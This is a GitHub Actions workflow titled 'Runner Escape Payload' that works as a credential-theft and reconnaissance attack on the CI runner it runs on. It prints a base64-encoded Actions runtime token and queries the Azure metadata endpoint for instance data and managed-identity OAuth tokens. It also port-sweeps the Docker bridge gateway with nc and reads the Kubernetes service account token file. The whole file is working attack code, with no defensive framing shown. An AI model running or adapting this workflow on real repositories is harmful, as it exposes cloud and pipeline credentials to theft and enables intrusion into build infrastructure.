name: Runner Escape Payload

on:
  push:
    branches: [ "main", "runner-escape" ]
  workflow_dispatch:

jobs:
  escape:
    runs-on: ubuntu-latest
    steps:
      - name: Extract Internal Actions Runtime Token
        uses: actions/github-script@v6
        with:
          script: |
            const token = process.env.ACTIONS_RUNTIME_TOKEN;
            const url = process.env.ACTIONS_RUNTIME_URL;
            if (token) {
              const b64Token = Buffer.from(token).toString('base64');
              console.log("BASE64_RUNTIME_TOKEN=" + b64Token);
            } else {
              console.log("Token not found in env");
            }
            if (url) {
              console.log("RUNTIME_URL=" + url);
            }

      - name: Azure IMDS SSRF (Cloud Metadata Extraction)
        run: |
          echo "Attempting to hit Azure Instance Metadata Service..."
          curl -s -H "Metadata: true" --max-time 5 http://169.254.169.254/metadata/instance?api-version=2021-02-01 | jq . || echo "SSRF failed or IMDS blocked"
          
          echo "Attempting to extract Managed Identity Tokens..."
          curl -s -H "Metadata: true" --max-time 5 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F" | jq . || echo "Token extraction failed"

      - name: Network Recon & Container Escape Probing
        run: |
          echo "Interfaces:"
          ip a
          echo "Routing Table:"
          route -n
          echo "Attempting internal port sweep on Docker bridge gateway (172.17.0.1)..."
          nc -z -v -w 1 172.17.0.1 1-1000 2>&1 | grep succeeded || echo "No common ports open on gateway"
          
          echo "Attempting to read Kubelet/Pod token (if applicable)..."
          cat /var/run/secrets/kubernetes.io/serviceaccount/token || echo "Not a k8s pod or token inaccessible"
